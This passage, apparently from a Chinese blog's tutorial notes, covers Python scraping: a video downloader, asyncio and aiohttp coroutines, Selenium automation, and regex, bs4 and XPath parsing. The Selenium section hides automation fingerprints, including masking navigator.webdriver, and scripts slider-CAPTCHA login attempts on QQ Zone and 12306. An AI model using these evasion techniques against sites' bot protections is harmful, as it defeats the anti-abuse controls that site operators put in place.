&#x27;video_(.*)&#x27;            video_id = re.findall(ex, detail_url)[0]            # print(detail_url)            # print(vedio_id)            # 对视频详情页 ajax 发起请求            ajax_url = &#x27;https://www.pearvideo.com/videoStatus.jsp?contId=&#123;false_id&#125;&amp;mrd=0.6923628803380188&#x27;.format(                false_id=video_id)            # print(ajax_url)            headers = &#123;                &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62&#x27;,                &#x27;Referer&#x27;: detail_url            &#125;            ajax_page_json = requests.get(url=ajax_url, headers=headers).json()            # print(ajax_page_json)            # 编写正则表达式            # ea = &quot;&#x27;, &#x27;srcUrl&#x27;: &#x27;(.*?)&#x27;&#125;&#125;&#125;&quot;            # 最后发现： ajax 的响应数据中得到的链接有些需要替换，自行对照，如下：            # 可访问：https://video.pearvideo.com/mp4/third/20220120/cont-1750332-15498275-092138-hd.mp4            # ajax： https://video.pearvideo.com/mp4/third/20220120/1642775491037-15498275-092138-hd.mp4            # 修改正则，实现视频url的拼接            ea = &quot;&#x27;, &#x27;srcUrl&#x27;: &#x27;.*?(-.*?)&#x27;&#125;&#125;&#125;&quot;            eb = &quot;, &#x27;srcUrl&#x27;: &#x27;(.*/)&quot;            # 此处需要使用 str() 方法将 ajax_page_json 对象强转为字符串            video_url_a = re.findall(ea, str(ajax_page_json))[0]            video_url_b = re.findall(eb, str(ajax_page_json))[0]            video_url = video_url_b + &#x27;cont-&#x27; + video_id + video_url_a            # print(video_url_a)            # print(video_url_b)            print(video_url)            # 获取到数据写入字典进行存储            video_dict = &#123;                &#x27;name&#x27;: name,                &#x27;url&#x27;: video_url            &#125;            # 列表嵌套字典，每个视频名和视频链接作为一个字典写入列表 urls            urls.append(video_dict)        return urls    def video_data(self, dict):        url = dict[&#x27;url&#x27;]        # print(url)        time.sleep(19)        data = requests.get(url=url, headers=self.headers).content        print(dict[&#x27;name&#x27;] + &#x27;下载中……&#x27;)        # 持久化存储        with open(&#x27;./梨视频/&#x27; + dict[&#x27;name&#x27;], &#x27;wb&#x27;) as fp:            fp.write(data)            print(dict[&#x27;name&#x27;] + &#x27;下载完成！！！&#x27;)if __name__ == &#x27;__main__&#x27;:    video = Video()    urls = []    urls = video.video_url()    # print(urls)    start = time.time()    # 通过进程池对视频数据进行请求    pool = Pool(4)    pool.map(video.video_data, urls)    # 同步爬虫比较    # for url in urls:    #     video.video_data(url)    end = time.time()    print(&#x27;全部下载完成……&#x27;)    # 上面加了个延时，直观点    print(end - start)\n单任务协程\n要理解难的，肯定先理解其下较为简单的，别说了，看源码\n\nimport asyncio# 协程单任务基本使用# 使用 async 关键字声明为异步函数async def request(url):    print(&#x27;正在请求的url为：&#x27; + url)    print(&#x27;请求成功：&#x27; + url)    return url# 调用协程，返回一个协程对象c = request(&#x27;0xtlu.me&#x27;)# # 创建一个事件循环对象# loop = asyncio.get_event_loop()# # 将协程对象注册到 loop 中，再启动 loop# loop.run_until_complete(c)# task 的使用# loop = asyncio.get_event_loop()# # 基于 loop 创建 task 对象# task = loop.create_task(c)# 打印 task 对象状态# # print(task)# # 注册协程对象并启动 loop# loop.run_until_complete(task)# # 再次打印 task 对象状态# print(task)# future 的使用# loop = asyncio.get_event_loop()# task = asyncio.ensure_future(c)# print(task)# loop.run_until_complete(task)# print(task)# 绑定回调# 回调函数def callback_func(task):    # result() 返回入伍对象中封装的协程对象对应函数（request()）的返回值    print(task.result())# 创建事件对象loop = asyncio.get_event_loop()# 创建任务对象task = asyncio.ensure_future(c)# 使用回调函数（add_done_callback）绑定任务对象（task）task.add_done_callback(callback_func)# 运行任务对象loop.run_until_complete(task)\n多任务协程\n单任务学完了，看多任务呗\n\nimport asyncioimport time# 协程多任务使用async def request(url):    print(&#x27;正在下载&#x27; + url)    # 异步协程中出现同步模块相关代码（time.sleep(2)），则无法异步    # time.sleep(2)    # 当asyncio 中遇到阻塞操作必需手动挂起（使用 await 关键字）    # await 用来用来声明程序的挂起    await asyncio.sleep(2)    print(&#x27;下载完毕&#x27; + url)urls = [&#x27;www.baidu.com&#x27;, &#x27;0xtlu.me&#x27;, &#x27;www.google.com&#x27;, &#x27;www.sogou.com&#x27;]# 存放任务列表tasks = []# 开始事件start = time.time()for url in urls:    c = request(url)    task = asyncio.ensure_future(c)    tasks.append(task)loop = asyncio.get_event_loop()# 人物列表封装到 wait 中loop.run_until_complete(asyncio.wait(tasks))print(time.time() - start)\n多任务协程实验\n这是一个难过的例子，有同步模块，看不到多任务异步协程效果\n\nimport asyncioimport timeimport requests# 多任务异步协程实现# 由于含同步模块代码，未实现start = time.time()urls = [&#x27;https://0xtlu.me/article/c2461216.html&#x27;, &#x27;https://0xtlu.me/article/82b683e3.html&#x27;,        &#x27;https://0xtlu.me/article/c86c0afc.html&#x27;]async def get_page(url):    print(&#x27;正在下载&#x27; + url)    # requests.get 为基于同步请求的模块，但现在需要的是给予异步的网络请求模块进行指定 url 的请求发送，即 aiohttp    response = requests.get(url=url)    print(&#x27;下载完毕&#x27; + response.text)tasks = []for url in urls:    c = get_page(url)    task = asyncio.ensure_future(c)    tasks.append(task)loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))end = time.time()print(&#x27;耗时：&#x27; + str(end - start))\naiohttp实现多任务异步协程\n上个题目的解决方案：通过 aiohttp 模块解决同步模块 requests，让异步协程正确运行\n\nimport asyncioimport timeimport aiohttpimport requests# aiohttp实现多任务异步协程# 环境安装# pip install aiohttp# 需要使用 aiohttp 模块的 ClientSession 对象start = time.time()urls = [&#x27;https://0xtlu.me/article/c2461216.html&#x27;, &#x27;https://0xtlu.me/article/82b683e3.html&#x27;,        &#x27;https://0xtlu.me/article/c86c0afc.html&#x27;]async def get_page(url):    print(&#x27;正在下载&#x27; + url)    async with aiohttp.ClientSession() as session:        # aiohttp 可以使用操作        # get() 或 post()        # headers,params/data,proxy=&#x27;http://ip:port/&#x27;        async with await session.get(url) as response:            # text() 方法返回字符串形式的响应数据            # read() 方法返回二进制形式的响应数据            # json() 方法返回 json 对象的响应数据            # 注：获取响应数据前需要使用 await 关键字手动挂起            page_text = await response.text()    print(&#x27;下载完毕&#x27; + page_text)tasks = []for url in urls:    c = get_page(url)    task = asyncio.ensure_future(c)    tasks.append(task)loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))end = time.time()print(&#x27;耗时：&#x27; + str(end - start))\nselenium模块基本使用\n之前看到过谷歌自动化的效果，现在使用 selenium 模块发现原来是这个家伙\n\nfrom selenium import webdriverfrom selenium.webdriver.chrome.service import Servicefrom lxml import etreefrom time import sleep# 爬取药监局企业名称# http://scxk.nmpa.gov.cn:81/xk/# 实例化一个浏览器对象（传入浏览器的驱动程序）## 老方法# 能运行，但由于版本更新时，executable_path 方法被重构到 Service 函数中而引起弃用警告# DeprecationWarning: executable_path has been deprecated, please pass in a Service object# driver = webdriver.Chrome(executable_path=&#x27;./chromedriver.exe&#x27;)## 新方法service = Service(executable_path=&#x27;./chromedriver.exe&#x27;)driver = webdriver.Chrome(service=service)### 指定　URL　发起搜索请求driver.get(&#x27;http://scxk.nmpa.gov.cn:81/xk/&#x27;)# 打印网页标题# print(driver.title)## 通过 page_source 方法获取网页源码page_text = driver.page_source# print(page_text)# 对网页源码进行数据解析tree = etree.HTML(page_text)li_list = tree.xpath(&#x27;//ul[@id=&quot;gzlist&quot;]/li&#x27;)# print(li_list)for li in li_list:    name = li.xpath(&#x27;./dl/@title&#x27;)[0]    print(name)### 暂停6s后关闭浏览器sleep(6)driver.close()\nselenium模块其他使用\n上一个标题是 selenium 模块的基本使用，现在看下它的元素定位、数据交互、前进后退等功能\n\nfrom time import sleepfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.chrome.service import Serviceservice = Service(executable_path=&#x27;./chromedriver.exe&#x27;)driver = webdriver.Chrome(service=service)driver.get(&#x27;https://www.taobao.com/&#x27;)# 进行标签定位## 不推荐使用 find——element_by_id() 方法# q_id = driver.find_element_by_id(&#x27;q&#x27;)## 通过 By 类定位页面上 id 为 &#x27;q&#x27; 的元素# By是 selenium 中内置的一个 class ，在该 class 中有各种方法来定位元素q_id = driver.find_element(By.ID, &#x27;q&#x27;)# print(q_id)## 搜索框写入数据实现交互q_id.send_keys(&#x27;iphone&#x27;)## 实现点击搜索按钮的效果# 获取按钮元素button = driver.find_element(By.CSS_SELECTOR, &#x27;.btn-search&#x27;)# 实现点击事件，由于没登陆不给搜，直接添砖登录界面button.click()### 执行一组 js 脚本# 使界面滚动到最底部driver.execute_script(&#x27;window.scrollTo(0,document.body.scrollHeight)&#x27;)### 实现回退效果：回到上一标签页# 先访问下自己的博客driver.get(&#x27;https://0xtlu.github.io&#x27;)# 延时2s后回退淘宝登录界面sleep(2)driver.back()# 继续延时2s后前进博客首页sleep(2)driver.forward()##sleep(6)driver.quit()\nselenium模块__iframe__动作链\n登陆界面一般都是存在验证的，通常是通过 iframe 标签实现当切换到 iframe 标签作用域时，需要实现一系列的动作——动作链的使用\n\n# 利用菜鸟教程的练习模块完成拖动效果的代码实现# https://www.runoob.com/try/try.php?filename=jqueryui-api-droppable# 运行感受，这是搜索引擎问题还是什么，界面加载不出来|未连接到互联网from time import sleepfrom selenium.webdriver import ActionChainsfrom selenium.webdriver.chrome.service import Servicefrom selenium import webdriverfrom selenium.webdriver.common.by import Byservice = Service(executable_path=&#x27;./chromedriver.exe&#x27;)driver = webdriver.Chrome(service=service)driver.get(&#x27;https://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#x27;)# 存在 iframe 标签，则定位其内部标签需先改变浏览器定位标签的作用域，使用如下方法# 即，通过 switch_to.frame() 方法将当前定位的主题切换为 iframe 表单的内嵌页面中# 主要为，通过 id、name、element (定位的某个元素)、索引来指定切换到的某个 iframe 表单driver.switch_to.frame(&#x27;iframeResult&#x27;)# 再通过 id 获取 iframe 表单内部待拖动的 div 标签draggable_id = driver.find_element(By.ID, &#x27;draggable&#x27;)# print(draggable_id)# 动作链# 要求：点击-拖动-放开点击# 当调用 ActionChains 的方法时，不会立即执行# 而是将所有的操作按顺序存放到队列中，当调用 perform() 方法时，根据队列依次执行# 实例化行为事件类 ActionChains，实现键盘鼠标的各个操作action = ActionChains(driver)# 实现鼠标左键长按标签事件action.click_and_hold(draggable_id)# 移动偏移for i in range(5):    # 调用 perform() 方法立即执行动作链    # move_by_offset(x, y) 方法参数解析：x（水平方向），y（垂直方向）    action.move_by_offset(50, 0).perform()    sleep(0.3)# 释放动作链（松开左键）action.release().perform()sleep(3)# 释放 actionaction.reset_actions()driver.quit()\n未实现登录QQ空间\n登录界面没有改变，但滑块与缺口间位置对齐比较麻烦，暂时不想理解对了，这里可以学到动作链的使用\n\n# 登录QQ空间from selenium.webdriver.common.by import Byfrom selenium.webdriver.chrome.service import Servicefrom selenium import webdriverfrom time import sleepfrom selenium.webdriver import ActionChainsservice = Service(executable_path=&#x27;./chromedriver.exe&#x27;)driver = webdriver.Chrome(service=service)driver.get(&#x27;https://qzone.qq.com/&#x27;)# iframe 标签中再定位driver.switch_to.frame(&#x27;login_frame&#x27;)a_tag = driver.find_element(By.ID, &#x27;switcher_plogin&#x27;)# 鼠标点击事件a_tag.click()## 账密定位username = driver.find_element(By.ID, &#x27;u&#x27;)password = driver.find_element(By.ID, &#x27;p&#x27;)# 清空原数据username.clear()password.clear()# 账密写入username.send_keys(&#x27;yourUser&#x27;)password.send_keys(&#x27;yourPasswd!&#x27;)# 点击登录事件login = driver.find_element(By.ID, &#x27;login_button&#x27;)sleep(2)seli = login.click()print(seli)sleep(6)# 自动化多了，提示：由于你的帐号存在异常，需要进行手机验证，请使用QQ手机版扫码进行登录。# 滑块验证# 切换定位作用域driver.switch_to.frame(&#x27;tcaptcha_iframe&#x27;)# 找到滑块slideBlock_id = driver.find_element(By.ID, &#x27;slideBlock&#x27;)# 实例化行为事件action = ActionChains(driver)# 点击且长按的动作链action.click_and_hold(slideBlock_id)# x 坐标值来源，浏览器控制台观察，拖动滑块时 img 标签的 style 属性中的 left 会改变，看重合时数值减去初始值即可action.move_by_offset(183, 0).perform()### 说一下问题，缺口位置不同导致滑块移动距离差异# 另一种方法，先安装下面两个模块# pip install opencv-python# pip install np# 看了看，步骤有点……不想复制，有兴趣自己了解吧# https://www.cnblogs.com/yxh-zixishi/p/14514493.htmlsleep(3)action.release().perform()sleep(36)driver.quit()\n无可视化界面与规避反反爬\n主要通过设置 chrome 的启动参数实现无可视化界面（无头浏览器）反反爬机制主要为屏蔽自动化的某些特征，如自动化控制提示、禁止启用 blink 功能和嵌入js等等\n\n# 实现无可视化界面和规避检测from selenium.webdriver.chrome.options import Optionsfrom selenium.webdriver import ChromeOptionsfrom selenium.webdriver.chrome.service import Servicefrom selenium import webdriverfrom time import sleep# 无可视化界面（无头浏览器）# options 是一个方便控制 chrome 启动时属性的类# 实例化 options 类option = Options()# 设置启动参数# 设置非可视化界面，非可视化 linux 中需设置非可视化才能正常运行option.add_argument(&#x27;--headless&#x27;)# 根据谷歌文档说明，该语句用于规避bugoption.add_argument(&#x27;--disable-gpu&#x27;)# 添加 UA (需要为 chrome 浏览器的 UA )option.add_argument(    &#x27;user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36&quot;&#x27;)# 开启开发者模式# 实现规避检测# 屏蔽自动化受控提示和开发者提示option.add_experimental_option(&#x27;excludeSwitches&#x27;, [&#x27;enable-automation&#x27;, &#x27;load-extension&#x27;])service = Service(executable_path=&#x27;./chromedriver.exe&#x27;)# DeprecationWarning: use options instead of chrome_options# chrome_options 已弃用# driver = webdriver.Chrome(service=service, chrome_options=option)# 改用 options# driver = webdriver.Chrome(service=service, options=option)# 添加规避driver = webdriver.Chrome(service=service, options=option)driver.get(&#x27;https://www.baidu.com/&#x27;)print(driver.page_source)sleep(6)driver.quit()\n登录12306\n哒哒，这就是看规避效果的时候了。没有进行无可视化界面处理哦\n\n# 12306from time import sleepfrom selenium.webdriver.chrome.service import Servicefrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver import ActionChainsfrom selenium.webdriver.chrome.options import Optionsoption = Options()# 屏蔽 webdriver 使用特征，绕过特征验证# 也可以通过向页面嵌入 js 代码规避检测，使用到再说# 屏蔽自动化受控提示和开发者提示option.add_experimental_option(&#x27;excludeSwitches&#x27;, [&#x27;enable-automation&#x27;, &#x27;load-extension&#x27;])# 禁止启用 blink 运行时的功能option.add_argument(&#x27;--disable-blink-features=AutomationControlled&#x27;)# 禁用自动扩展（插件）option.add_experimental_option(&#x27;useAutomationExtension&#x27;, False)# 屏蔽&#x27;保存密码&#x27;提示框prefs = &#123;&#125;prefs[&quot;credentials_enable_service&quot;] = Falseprefs[&quot;profile.password_manager_enabled&quot;] = Falseoption.add_experimental_option(&quot;prefs&quot;, prefs)service = Service(executable_path=&#x27;./chromedriver.exe&#x27;)driver = webdriver.Chrome(service=service, options=option)# 嵌入 js 代码进行规避# chrome 高版本后该规避不知道还行不行（用不出来），这里不做肯定# with open(&#x27;./js.js&#x27;) as f:#     js = f.read()# driver.execute_cdp_cmd(&quot;Page.addScriptToEvaluateOnNewDocument&quot;, &#123;#   &quot;source&quot;: js# &#125;))## 利用 Chrome 开发工具协议，正确从 selenium 启动的 Chrome 浏览器中隐藏 window.navigator.webdriver 关键字# 单步测试可以使用# 对比了下，应该是我的 js 文件中没写相关的语句导致无法实现规避效果driver.execute_cdp_cmd(&quot;Page.addScriptToEvaluateOnNewDocument&quot;, &#123;    &quot;source&quot;: &quot;&quot;&quot;                    Object.defineProperty(navigator, &#x27;webdriver&#x27;, &#123;                      get: () =&gt; undefined                    &#125;)                  &quot;&quot;&quot;&#125;)driver.get(&#x27;https://kyfw.12306.cn/otn/resources/login.html&#x27;)username = driver.find_element(By.ID, &#x27;J-userName&#x27;)password = driver.find_element(By.ID, &#x27;J-password&#x27;)sleep(1)username.clear()password.clear()sleep(2)username.send_keys(&#x27;yourUser&#x27;)sleep(1)password.send_keys(&#x27;yourPasswd&#x27;)sleep(2)login = driver.find_element(By.ID, &#x27;J-login&#x27;)sleep(2)login.click()sleep(2)slide = driver.find_element(By.ID, &#x27;nc_1_n1z&#x27;)sleep(2)print(slide)action = ActionChains(driver)action.click_and_hold(slide)# 直接滑到尽头，这个比较简单action.move_by_offset(300, 0).perform()action.release().perform()sleep(1)# action.click_and_hold(slide)# for i in range(5):#     sleep(1)#     action.move_by_offset(60, 0).perform()# sleep(1)# action.release().perform()# 拖动完成后报错：# 哎呀，出错了，点击刷新再来一次(error:EQaZmr)# 感觉像机器验证# 确认了 webdriver 必作为反爬虫特征处理，so 不给你登sleep(10)# 休眠一下，拿到当前页面源码print(driver.page_source)action.reset_actions()driver.quit()\n后记\n写完了，写过一遍了，懂了吗？没有为什么做笔记，方便之后的回顾呀\n\n","categories":["Python"],"tags":["爬虫"]},{"title":"爬虫之数据解析相关","url":"/article/c86c0afc.html","content":"声明\n本教程仅供学习参考，请勿用在非法途径上，违者后果自负，与笔者无关。 –涂寐\n\n聚焦爬虫\n用于爬取页面中指定的页面内容\n\n编码流程\n指定url\n发起请求\n数据解析\n持久化存储\n\n方法分类\n正则表达式\nbs4解析\nxpath解析\n\n简述使用\n需求内容在标签间或作为标签的属性存储\n标签定位\n从标签间或标签属性值中提取所需\n\n正则表达式网页源代码&lt;div class=&quot;thumb&quot;&gt;\t&lt;a href=&quot;/article/124982889&quot; target=&quot;_blank&quot;&gt;\t\t&lt;img src=&quot;//pic.qiushibaike.com/system/pictures/12498/124982889/medium/B39EVD457VB64VZH.jpg&quot; alt=&quot;糗事#124982889&quot; class=&quot;illustration&quot; width=&quot;100%&quot; height=&quot;auto&quot;&gt;\t&lt;/a&gt;&lt;/div&gt;\n取src正则ex = &#x27;&lt;div class=&quot;thumb&quot;&gt;.*?&lt;img src=&quot;(.*?)&quot; alt.*?&lt;/div&gt;&#x27;\n糗事百科糗图#!/usr//bin/env python3# -*-coding:utf-8-*-# 解析第一行# 防止操作系统用户没有将python装在默认的/usr/bin路径里# 首先会到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成操作# 白话理解，调用该程序时自动查找合适的python解析器# 爬取糗事百科图片import os.pathimport reimport requestsif __name__ == &quot;__main__&quot;:    # 创个文件夹存储图片    # 旧    # if not os.path.exists(&#x27;./qiutuLibs&#x27;):    # 新    if os.path.exists(&#x27;./qiutuLibs&#x27;) is False:        os.mkdir(&#x27;./qiutuLibs&#x27;)    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#x27;    &#125;    # 爬取单个图片数据    # # 复制图片地址，看URL    # url = &#x27;https://pic.qiushibaike.com/system/pictures/12497/124970827/medium/5L6E0C2Y21U8FG4N.jpg&#x27;    # # content() 方法是返回图片的二进制形式数据    # # text（字符串） content（二进制）    json()（对象）    # img_data = requests.get(url=url, headers=headers).content    #    # with open(&#x27;./img.jpg&#x27;, &#x27;wb&#x27;) as fp:    #     fp.write(img_data)    #     fp.close()    # print(&#x27;爬取结束，瞅瞅成功不~&#x27;)    # 使用通用爬虫对url对应的页面进行爬取    # 单页    # url = &#x27;https://www.qiushibaike.com/imgrank/&#x27;    # page_text = requests.get(url=url, headers=headers).text    # 使用聚焦爬虫解析/提取所有图片    # ex = &#x27;&lt;div class=&quot;thumb&quot;&gt;.*?&lt;img src=&quot;(.*?)&quot; alt.*?&lt;/div&gt;&#x27;    # img_src_list = re.findall(ex, page_text, re.S)    # print(img_src_list)    # for src in img_src_list:    #     # 拼全地址    #     src = &#x27;https:&#x27; + src    #     # 请求二进制数据    #     img_data = requests.get(url=src, headers=headers).content    #     # 生成图片名称    #     img_name = src.split(&#x27;/&#x27;)[-1]    #     # 图片存储路劲    #     imgPath = &#x27;./qiutuLibs/&#x27; + img_name    #     with open(imgPath, &#x27;wb&#x27;) as fp:    #         fp.write(img_data)    #         print(img_name, &quot;下载成功&quot;)    #         fp.close()    # 多页    url = &#x27;https://www.qiushibaike.com/imgrank/page/%d/&#x27;    # 可迭代对象：https://www.runoob.com/python3/python3-func-range.html    for pageNum in range(1, 2):        # 拼接页码        # 字符串格式化函数：https://www.runoob.com/python/att-string-format.html        # 老方法        # new_url = format(url % pageNum)        # 新方法        new_url = &#x27;&#123;&#125;&#123;&#125;&#x27;.format(url, pageNum)        print(new_url)        page_text = requests.get(url=new_url, headers=headers).text        # https://zhuanlan.zhihu.com/p/139596371        # 使用正则表达式解析/提取所有图片        # .* 表示匹配除 \\n 外任意字符出现零次或多次        # ? 跟在 * 或 + 后边时，表示懒惰模式，即非贪婪模式，用以匹配尽可能少的字符        # a.*?b 匹配最短的，以a开始，以b结束的字符串        # 在正则里面 &quot;()&quot; 代表分组，即一个括号代表一个分组        # 正则特点，有括号时只能匹配到括号中的内容，没有括号就正常匹配        # (.*?) 表示仅匹配到括号中的内容        ex = &#x27;&lt;div class=&quot;thumb&quot;&gt;.*?&lt;img src=&quot;(.*?)&quot; alt.*?&lt;/div&gt;&#x27;        # def findall(pattern, string, flags=0)        # 返回string中所有与pattern匹配的全部字符串,返回形式为数组        # re.S参数：正则表达式会将字符串page_text中内容作为一个整体进行匹配，不会对\\n进行中断        img_src_list = re.findall(ex, page_text, re.S)        for src in img_src_list:            # 拼全地址            src = &#x27;https:&#x27; + src            # 请求二进制数据，content中存储字节码            img_data = requests.get(url=src, headers=headers).content            # 生成图片名称            # str.split(str=&quot;&quot;, num=string.count(str))            # split() 通过第一参数 str 指定分隔符对字符串进行切片，如果第二个参数 num 有指定值，则分割为 num+1 个子字符串。            # src.split(&#x27;/&#x27;)[-1] 对 src 字符串以‘/ ’分割，取出最后一段赋予img_name            img_name = src.split(&#x27;/&#x27;)[-1]            # 图片存储路径            imgPath = &#x27;./qiutuLibs/&#x27; + img_name            with open(imgPath, &#x27;wb&#x27;) as fp:                fp.write(img_data)                print(img_name, &quot;下载成功&quot;)                fp.close()\nBS4解析简述原理\n实例化一个BeautifulSoup对象，将页面源码数据加载到该对象中\n调用BeautifulSoup对象中的属性和方法进行标签定位和数据提取\n\n环境安装# Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构，每个节点都是Python对象，所有对象可以归纳为4种：tag，NavigableString，BeautifulSoup，Comment。php install bs4# lxml是python的一个解析库，支持HTML和XML的解析，支持XPath解析方式pip install lxml\n使用概要\nfrom bs4 import BeautifulSoup\n\nBeautiful Soup对象实例化\n\n将本地html文档数据加载到BeautifulSoup对象\nfp = open(&#x27;./localWeb.html&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;)soup = BeautifulSoup(fp, &#x27;lxml&#x27;)\n\n或，将门户网站拉取的页面源码加载到BeautifulSoup对象\n\n\npage_text = response.textsoup = BeautifulSoup(page_text, &#x27;lxml&#x27;)\n相关属性和方法# 本次测试HTML为笔者博客首页网页源码 soup.tagName:\t返回文档中第一次出现的 tagName 标签soup.tagName[&#x27;PropertyName&#x27;]：提取 tagName 标签中属性名为 PropertyName 的值soup.find(&#x27;tagName&#x27;)：返回文档中第一次出现的 tagName 标签soup.find(&#x27;a&#x27;, class_=&quot;active&quot;)：根据属性再次定位soup.find_all(&#x27;tageName&#x27;)：返回所有 tageName 标签的列表soup.select(&#x27;.selectorName&#x27;)：根据 id/class 等选择器返回对应列表soup.select(&#x27;.header-drawer &gt; ul &gt; li &gt;a&#x27;)：层级选择器，一个 &gt; 表示一个层级soup.select(&#x27;.header-drawer &gt; ul a&#x27;)：一个 空格 表示多个层级soup.select(&#x27;.header-drawer &gt; ul a&#x27;)[2]：如数组，通过下标选择列表中的某个，此处选择位序为 3 的 a 标签soup.select(&#x27;.header-drawer &gt; ul a&#x27;)[1].text：text 属性拿到标签间所有文本内容soup.select(&#x27;.header-drawer &gt; ul a&#x27;)[3].string：string属性拿到标签间直系文本内容，请通过 find() 方法测试soup.select(&#x27;.header-drawer &gt; ul a&#x27;)[4].get_text()：get_text() 方法拿到标签间所有文本内容\n本地测试#!/usr/bin/env python3# -*-coding:utf-8-*-from bs4 import BeautifulSoupif __name__ == &quot;__main__&quot;:    # 加载本地的html文档数据到 BeautifulSoup 对象中    # 以只读方式、utf-8 编码格式打开 localWeb.html    fp = open(&#x27;./localWeb.html&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;)    # 调用 BeauSoup 类的构造方法初始化本对象，以 lxml 的解析方式传入 fp 的数据    soup = BeautifulSoup(fp, &#x27;lxml&#x27;)    # print(soup)    # 获取第一次出现的 a 标签    # print(soup.a)    # print(soup.div)    # print(soup.find(&#x27;a&#x27;, class_=&quot;active&quot;))    # print(soup.find_all(&#x27;a&#x27;))    # print(soup.select(&#x27;.theme-version&#x27;))    # 层级选择器，获取标签机间文本内容    # print(soup.select(&#x27;.header-drawer &gt; ul a&#x27;)[1].text)    # print(soup.select(&#x27;.header-drawer &gt; ul a&#x27;)[1].string)    # print(soup.select(&#x27;.header-drawer &gt; ul a&#x27;)[4].get_text())    # 获取标签属性内容    print(soup.a[&#x27;href&#x27;])\n三国演义小说#!/usr/bin/env python3# -*-coding:utf-8-*-# 要求爬取三国演义所有章节标题和内容# https://www.shicimingju.com/book/sanguoyanyi.htmlimport requestsfrom bs4 import BeautifulSoupif __name__ == &quot;__main__&quot;:    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;    &#125;    url = &#x27;https://www.shicimingju.com/book/sanguoyanyi.html&#x27;    # 调用 encode(&#x27;ISO-8859-1&#x27;) 方法，解决乱码问题    # 对返回包进行ISO-8859-1编码，保证了中文的正确读写    page_text = requests.get(url=url, headers=headers).text.encode(&#x27;ISO-8859-1&#x27;)    print(page_text)    # 检测编码方式    # print(page_text.encoding)    # 在解析章节标题和详情页URL    # 1、实例化 BeautSoup对象    soup = BeautifulSoup(page_text, &#x27;lxml&#x27;)    # 匹配    li_list = soup.select(&#x27;.book-mulu &gt; ul &gt; li&#x27;)    fp = open(&#x27;./sanguo.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)    for li in li_list:        # 拿标题        title = li.a.string        # 拿URL        detail_url = &#x27;https://www.shicimingju.com&#x27; + li.a[&#x27;href&#x27;]        # 请求详情页内容        detail_page_text = requests.get(url=detail_url, headers=headers, ).text.encode(&#x27;ISO-8859-1&#x27;).decode(&#x27;utf-8&#x27;)        # print(detail_page_text)        # 解析详情页内容        detail_soup = BeautifulSoup(detail_page_text, &#x27;lxml&#x27;)        # 通过类选择其专门定位该div标签        div_tag = detail_soup.find(&#x27;div&#x27;, class_=&#x27;chapter_content&#x27;)        # 得到章节具体内容        # 看了下，额，红楼梦？这网站运维，阔以        # 通过text属性或get_text()，获取div标签中的所有文本内容        content = div_tag.get_text()        fp.write(title + &#x27;:&#x27; + content + &#x27;\\n&#x27;)        print(title, &#x27;爬取成功！！！&#x27;)\n\n\nxpath解析原理\n实例化etree对象，将待解析页面源码加载到其中\n调用etree对象得xpath方法，结合xpath表达式实现标签定位和内容捕获\n\n环境pip install lxml\n使用举例\n本地：etree.parse(filePath)\n网络：etree.HTML(‘page_text’)\n\nxpath表达式/：表示一个层级，从html标签（根标签）开始定位//：表示多个层级，可从任意位置开始定位tagName[@class=&quot;PropertyName&quot;]：属性定位，精准定位tagName[@class=&quot;PropertyName&quot;]/tageName[1]：索引定位，索引以1为始tagName[@class=&quot;PropertyName&quot;]/tageName/text()：/text()方法取直系标签文本内容，//text()取非直系标签（其下所有）文本内容，返回列表，可通过下标选择某个列表值tagName[@class=&quot;PropertyName&quot;]/tagName/@PropertyName：通过@标签中属性来提取属性值\n本地测试#!/usr/bin/env python3# -*-coding:utf-8-*-from lxml import etreeif __name__ == &quot;__main__&quot;:    # 实例化etree对象，并写入本地html源码    # 默认是XML解析器，碰到不规范的html文件时就会解析错误，增加解析器    parser = etree.HTMLParser(encoding=&#x27;utf-8&#x27;)    tree = etree.parse(&#x27;localWeb.html&#x27;, parser=parser)    # 找网站标题，单一，不会重复    # r = tree.xpath(&#x27;/html/head/title&#x27;)    # 匹配到该层级下同辈份的所有div标签，    # r = tree.xpath(&#x27;/html/body/main/div/div&#x27;)    # 匹配到使用多层级选择符（//）父级（此处为main）之后不同辈分的所有div标签    # r = tree.xpath(&#x27;/html/body/main//div&#x27;)    # 属性定位，精准定位--此处定位到个人名言处    # r = tree.xpath(&#x27;/html/body/main//div[@class=&quot;description&quot;]&#x27;)    # 同效果    # r = tree.xpath(&#x27;//div[@class=&quot;description&quot;]&#x27;)    # 索引定位    r = tree.xpath(&#x27;//div[@class=&quot;s-icon-list&quot;]/span[1]&#x27;)    # /text()方法取直系标签内容，返回列表    # r = tree.xpath(&#x27;//div[@class=&quot;header-drawer&quot;]//li[2]/a/text()&#x27;)    # 利用下标选择返回列表的某个值    # r = tree.xpath(&#x27;//div[@class=&quot;header-drawer&quot;]//li[2]/a/text()&#x27;)[0]    # //text()取其下所有标签内容    r = tree.xpath(&#x27;//div[@class=&quot;header-drawer&quot;]//li//text()&#x27;)    print(r)\n58二手房#!/usr/bin/env python3# -*-coding:utf-8 -*-import requestsfrom lxml import etree# 爬取58二手房房源信息if __name__ == &quot;__main__&quot;:    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) 